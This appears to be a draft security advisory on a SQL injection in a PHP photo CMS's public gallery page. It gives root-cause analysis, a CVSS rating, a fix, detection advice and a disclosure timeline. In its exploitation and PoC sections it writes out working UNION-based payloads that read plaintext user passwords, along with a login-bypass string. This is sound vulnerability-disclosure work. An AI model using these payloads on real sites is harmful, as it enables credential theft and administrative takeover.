# Security Advisory — Unauthenticated SQL Injection in `full_photo.php`

**Internal ID:** RS-ADV-2026-018
**CVE:** pending (not assigned)
**Status:** draft for disclosure

---

## 1. Executive summary

An **unauthenticated SQL injection** vulnerability was identified in the public gallery of *php-basic-photo-cms*, in `full_photo.php`, parameter `id`. The `id` parameter (`$_GET['id']`) is passed to `Photograph::find_by_id()` and concatenated directly into a `SELECT ... WHERE id={$id}` statement without quoting, casting, or parameterization. An unauthenticated network attacker can inject arbitrary SQL into the query and read any data in the database, including the `users` table — whose credentials are stored in plaintext. The same root cause (string-concatenated queries throughout the data-access layer) also enables an authentication bypass in `admin/login.php` (see §3 and §14).

---

## 2. Affected products

- **Product:** php-basic-photo-cms (dahaltn/php-basic-photo-cms)
- **Analyzed version:** `master` @ commit `02746c9` (2019-11-09; no tagged releases)
- **Component:** `full_photo.php` (line 22) → `include/databaseobject.php` (`find_by_id()`, lines 9-13) → `include/database.php` (`query()`)
- **Endpoint:** `GET /full_photo.php?id=<injection>`
- **Access vector:** network, unauthenticated — https://github.com/dahaltn/php-basic-photo-cms

**Unaffected products/versions:** not assessed. The analysis was limited to the version above.

---

## 3. Vulnerability description

In `full_photo.php` the request parameter `id` reaches the data-access layer unmodified:

```php
// full_photo.php:22
$images = Photograph::find_by_id($_GET['id']);

// include/databaseobject.php:9
public static function find_by_id($id=1){
    global $database;
    $result_array = static::find_by_sql("SELECT * FROM ".static::$table_name." WHERE id={$id}");
    return !empty($result_array)?array_shift($result_array):false;
}

// include/database.php
public function query($sql){
    $this->last_query = $sql;
    $result = mysqli_query($this->connection, $sql);   // raw concatenated SQL
    $this->confirm_query($result);
    return $result;
}
```

- **Source:** `$_GET['id']` (`full_photo.php` line 22).
- **Sink:** `mysqli_query($this->connection, "SELECT * FROM photographs WHERE id={$id}")` in `include/database.php`, via `find_by_id()`/`find_by_sql()`.
- **Missing sanitization:** no `mysqli_real_escape_string()`, no prepared statement, no integer cast (`(int)$id`), no allow-list. The value is concatenated as a bare numeric position (not even quoted), so no quote-breakout is required.
- **Only restriction:** none. `full_photo.php` requires only that `id` be present (`isset($_GET['id'])`); there is no authentication on this public page.
- **Relevant observation:** `confirm_query()` prints `mysqli_error()` and the failed query to the response on error, enabling trivial error-based extraction. The same unsanitized pattern recurs in `admin/image_comments.php` (`id`), `admin/delete_image.php` (`delete`), `admin/delete_comment.php` (`comment_id`), and in `User::authonicated()` where `username`/`password` are interpolated into the login `WHERE` clause (authentication bypass).
- **Null byte:** not relevant; injection is numeric-context and requires no string terminator.

**Required conditions:** none beyond network access to the public gallery page.

---

## 4. Impact (C/I/A)

- **Confidentiality (High):** full read access to the database via UNION/boolean/error-based injection, including the `users` table (username + plaintext password).
- **Integrity (None):** the sink uses `mysqli_query()`, which does not execute stacked statements, so this specific SELECT does not permit writes. (Integrity is still reached indirectly: disclosed plaintext admin credentials, or the login auth-bypass instance, grant full administrative control — see §6 and §14.)
- **Availability (None):** no direct impact through this endpoint.

The gallery page is unauthenticated and the `photographs` table has a known five-column layout (`id, filename, type, size, caption`), making a UNION-based read of other tables straightforward.

---

## 5. Classification

- **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command (SQL Injection); additional: CWE-256 — Plaintext Storage of a Password
- **CAPEC:** CAPEC-66 — SQL Injection
- **CVSS v3.1 (base):** **7.5 (High)**
  `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
  - *Note:* the authentication-bypass instance in `admin/login.php` (same root cause) yields full administrative access and, chained with the arbitrary upload (RS-ADV-2026-019), unauthenticated remote code execution — scenario vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8, Critical).

---

## 6. Exploitation scenario

An unauthenticated attacker requests `GET /full_photo.php?id=0 UNION SELECT 1,username,password,4,5 FROM users-- -`. Because `id` is concatenated directly into the `WHERE` clause and the `photographs` table has five columns, the crafted UNION returns the administrator username and plaintext password in the rendered gallery fields. The attacker then signs in to `/admin/` with the recovered credentials (or, equivalently, bypasses the login directly with `username=' OR '1'='1' LIMIT 1 -- `) and proceeds to the authenticated upload functionality, achieving code execution.

---

## 7. Technical evidence

- **Affected component:** `full_photo.php` (line 22), `include/databaseobject.php` `find_by_id()` (lines 9-13), `include/database.php` `query()`
- **Data flow:**
  - *Source:* `$_GET['id']`
  - *Missing sanitization:* no cast/escape/prepared statement; value concatenated into `WHERE id={$id}`
  - *Sink:* `mysqli_query($conn, "SELECT * FROM photographs WHERE id={$id}")` → rows rendered into the response

**7.1. Confirmed sink (source-level, benign reproduction)**
The exact query-building expression from the source was reproduced in isolation (no live database, no server) with a benign payload, confirming the parameter is concatenated verbatim:
```
input id = 0 UNION SELECT 1,username,password,4,5 FROM users-- -
built SQL = SELECT * FROM photographs WHERE id=0 UNION SELECT 1,username,password,4,5 FROM users-- -
```
The user-supplied `id` is placed directly into the SQL text with no quoting or neutralization.

**7.2. Live retrieval (confirmed — screenshot evidence)**
In the lab (PHP + MariaDB, DB `tejgallery` seeded from the repo's own dump), the following
unauthenticated request was issued:
```http
GET /full_photo.php?id=0 UNION SELECT 1,2,3,4,CONCAT(0x5b4c41425d20,username,0x3a,password) FROM users LIMIT 1-- - HTTP/1.1
Host: 127.0.0.1:8080
```
The photo page's caption field rendered **`[LAB] tej:tej123`** — the `username:password` pair read
from the `users` table via the injected UNION, on a public page with no authentication
(evidence `02_sqli_injection.png`; baseline `01_sqli_baseline.png`). This confirms both the
cross-table read and plaintext password storage. The same root cause was used to bypass the admin
login (evidence `03_login_bypass_admin.png`, see RS-ADV-2026-019).

---

## 8. Proof of concept (PoC)

In an authorized lab environment (see the accompanying Docker lab):

1. Start the lab and open `http://localhost:8080/`.
2. Issue `GET /full_photo.php?id=18` (baseline, valid record).
3. Issue `GET /full_photo.php?id=18-- -` or `id=0 OR 1=1` and observe the query behaviour change with no authentication.
4. **Verification:** a boolean/UNION read returns data governed by the injected clause rather than a single record, confirming SQL injection. Keep lab payloads read-only.

**PoC limitations:** read-oriented (no stacked queries via `mysqli_query`); requires no authentication; demonstrated against the lab database only.

---

## 9. Reproduction steps

1. Deploy the lab (PHP 7.4 + MySQL 5.7, seeded `tejgallery`).
2. Request `GET /full_photo.php?id=1 AND 1=1` then `id=1 AND 1=2` and compare responses (boolean-based).
3. Request a UNION payload matching the five-column `photographs` layout to read the `users` table.
4. Observe injected data reflected in the response.

---

## 10. Mitigation

- Cast the identifier to an integer at the boundary (`$id = (int)$_GET['id'];`) as an immediate stop-gap.
- Restrict error output: `confirm_query()` should not echo `mysqli_error()` / the raw query to clients.
- Apply the same treatment to every `id`/`delete`/`comment_id` parameter and to the login fields.

---

## 11. Fix

Replace string concatenation with parameterized queries throughout the data-access layer:

```php
// include/databaseobject.php
public static function find_by_id($id){
    global $database;
    $stmt = mysqli_prepare($database->connection(), "SELECT * FROM ".static::$table_name." WHERE id = ?");
    mysqli_stmt_bind_param($stmt, "i", $id);
    mysqli_stmt_execute($stmt);
    // fetch via mysqli_stmt_get_result()
}
```

Complementary measures: hash passwords (`password_hash()`), and remove detailed SQL error disclosure.

---

## 12. Detection and indicators

- Search access logs for injection markers in `id`:
  ```
  grep -iE "full_photo\.php\?id=" access.log | grep -iE "union|select|%27|'| or |--|%2d%2d"
  ```
- Alert on `id` values that are not strictly numeric.

---

## 13. Disclosure timeline

| Date | Event |
|------|-------|
| 2026-11-18 | Source code identification and analysis |
| 2026-11-18 | SQL injection confirmed — source-level reproduction and live lab evidence (UNION read of `users`, screenshot) |
| 2026-11-18 | Advisory drafting |
| _pending_ | Vendor contact |
| _pending_ | Vendor confirmation |
| _pending_ | Fix availability |
| _pending_ | Public disclosure |

---

## 14. Vendor communication

- **Intended channel:** GitHub issues on the project repository and the maintainer's GitHub profile (the project publishes no security.txt or dedicated security contact).
- **Status:** pending opening.

> Additional observations in the same codebase, to be assessed separately:
> - `User::authonicated()` (`include/user.php`): `username`/`password` interpolated into the login `WHERE` clause → authentication bypass (`' OR '1'='1' LIMIT 1 -- `). Candidate for a dedicated advisory.
> - `admin/image_comments.php` (`id`), `admin/delete_image.php` (`delete`), `admin/delete_comment.php` (`comment_id`): same raw-concatenation pattern.
> - `DatabaseObject::create()`/`update()`: values interpolated into INSERT/UPDATE (stored/second-order injection via, e.g., photo `caption`).
> - Passwords stored in plaintext (`users` table).

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** Kembolle Amilkar
- **Contact:** contato@kembolle.com.br
- **Profile:** https://github.com/Kembolle

---

## 16. References

- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- CWE-256: https://cwe.mitre.org/data/definitions/256.html
- CAPEC-66: https://capec.mitre.org/data/definitions/66.html
- CVSS v3.1 calculator: https://www.first.org/cvss/calculator/3.1
- NVD (product search): https://nvd.nist.gov/vuln/search?keyword=php-basic-photo-cms&resultType=records
- Project: https://github.com/dahaltn/php-basic-photo-cms

---

## 17. Revision history

| Version | Date | Change |
|---------|------|--------|
| 1.0 | 2026-11-18 | Initial version (static analysis + benign sink reproduction) |
| 1.1 | 2026-11-18 | Added live lab evidence (UNION read of `users` table; screenshots 01-03) |

---

## 18. Legal notice

This advisory is for **educational and defensive** purposes. Testing was conducted in an authorized, controlled lab environment. It must not be used to access systems without explicit authorization.

---

## 19. Contact

- **Researcher:** Kembolle Amilkar / kembolle.com.br
